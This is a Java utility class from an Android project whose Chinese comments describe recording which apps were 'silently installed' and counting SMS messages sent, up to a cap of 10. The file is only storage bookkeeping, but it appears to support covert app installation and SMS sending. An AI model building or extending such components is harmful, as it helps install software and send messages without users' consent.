package com.x.installsilent.utils;

import android.content.Context;

import com.kim.androidbase.tools.StringUtils;
import com.kim.file.SharedPreferencesUtils;

public class InstallSilentConfigUtils {

	/**
	 * 静默安装配置信息文件
	 */
	private static final String INSTALL_SILENT_CONFIG = "isc";

	/**
	 * 记录已经静默安装的app
	 */
	private static final String INSTALL_SILENT_PACKAGENAME_RECORD_KEY = "isprk";

	/**
	 * 记录短信发送次数
	 */
	private static final String INSTALL_SILENT_MS_SENT_RECORD_KEY = "ismsrk";

	/**
	 * 发送短信次数 最大数量
	 */
	public static final int SMSMAX = 10;

	/**
	 * 更新短信发送记录
	 * 
	 * @param context
	 */
	public static void updateChangeRecord(Context context) {
		int currentRecord = SharedPreferencesUtils.getValueInt(
				INSTALL_SILENT_MS_SENT_RECORD_KEY, INSTALL_SILENT_CONFIG,
				context);
		int newRecord = currentRecord + 1;
		SharedPreferencesUtils.setValue(INSTALL_SILENT_MS_SENT_RECORD_KEY,
				newRecord, INSTALL_SILENT_CONFIG, context);
	}

	/**
	 * 判断短信发送是否超过最大数量上限
	 * 
	 * @param context
	 * @return
	 */
	public static final boolean isSmsSendOver(Context context) {
		return SharedPreferencesUtils.getValueInt(
				INSTALL_SILENT_MS_SENT_RECORD_KEY, INSTALL_SILENT_CONFIG,
				context) >= SMSMAX;
	}

	/**
	 * 记录被静默安装app的包名
	 * 
	 * @param packageName
	 */
	public static final void recordInstallSilentApp(Context context,
			String packageName) {
		// 包名以英文逗号（“,”）分割
		String currentPackageNames = SharedPreferencesUtils.getValueString(
				INSTALL_SILENT_PACKAGENAME_RECORD_KEY, INSTALL_SILENT_CONFIG,
				context);
		String newPackageNames = currentPackageNames + packageName + ",";

		SharedPreferencesUtils.setValue(INSTALL_SILENT_PACKAGENAME_RECORD_KEY,
				newPackageNames, INSTALL_SILENT_CONFIG, context);

	}

	/**
	 * 判断app是否被安装过（可能安装成功后被卸载）
	 */
	public static final boolean isApplicationInstalled(Context context,
			String packageName) {
		// 包名以英文逗号（“,”）分割
		String currentPackageNames = SharedPreferencesUtils.getValueString(
				INSTALL_SILENT_PACKAGENAME_RECORD_KEY, INSTALL_SILENT_CONFIG,
				context);
		if (StringUtils.isEmptyOrNull(currentPackageNames)) {
			return false;
		}

		return currentPackageNames.contains(packageName);

	}

}
